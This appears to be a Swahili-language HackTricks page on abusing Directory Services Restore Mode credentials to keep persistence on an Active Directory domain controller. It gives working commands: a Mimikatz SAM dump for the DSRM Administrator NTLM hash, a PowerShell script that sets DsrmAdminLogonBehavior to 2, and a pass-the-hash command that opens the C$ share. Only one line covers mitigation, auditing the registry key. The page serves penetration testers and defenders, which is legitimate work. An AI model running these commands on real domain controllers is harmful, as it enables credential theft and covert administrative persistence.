# DSRM Credentials

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Msingi

Kila domain controller ina akaunti ya msimamizi ya Directory Services Restore Mode (DSRM). Nenosiri lake huwekwa wakati wa ku-promote domain controller na ni tofauti na akaunti za Active Directory domain.<sup>[[1]](#references)</sup>

Mshambulizi aliye na udhibiti wa kiutawala wa domain controller anaweza kudump database ya ndani ya SAM na kurejesha NTLM hash ya DSRM Administrator. Command ifuatayo ya Mimikatz hufanya operesheni hiyo:<sup>[[2]](#references)</sup>
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Kwa chaguo-msingi, akaunti ya DSRM imekusudiwa kwa hali ya kurejesha. Kuweka `DsrmAdminLogonBehavior` kuwa `2` huruhusu akaunti hii ya ndani kufanya authentication wakati domain controller inaendelea kufanya kazi kwa kawaida. Kagua thamani hiyo kabla ya kuibadilisha:<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$current = Get-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue

if ($null -eq $current) {
New-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD
} else {
Set-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2
}
```
Hash iliyopatikana inaweza kutumika katika session ya pass-the-hash kufikia resources kama vile share ya kiutawala `C$`. Kwa akaunti hii ya ndani, tumia jina la computer la domain controller kama thamani ya `/domain`:<sup>[[3]](#references)</sup>
```powershell
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
# In the new PowerShell process, access C$ over NTLM.
ls \\dc-host-name\C$
```
## Mitigation

- Kagua mabadiliko kwenye `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`. Tukio la usalama 4657 hurekodi marekebisho ya thamani ya registry wakati SACL ya ufunguo imesanidiwa kukagua shughuli za **Set Value**.<sup>[[4]](#references)</sup>

## References

- [1] [Microsoft: Weka upya nenosiri la msimamizi wa Directory Services Restore Mode](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
- [2] [ADSecurity: Persistence ya Kisiri kwenye Active Directory #11 — Directory Service Restore Mode](https://adsecurity.org/?p=1714)
- [3] [ADSecurity: Persistence ya Kisiri kwenye Active Directory #13 — DSRM Persistence v2](https://adsecurity.org/?p=1785)
- [4] [Microsoft: Tukio la 4657 — Thamani ya registry ilirekebishwa](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
{{#include ../../banners/hacktricks-training.md}}
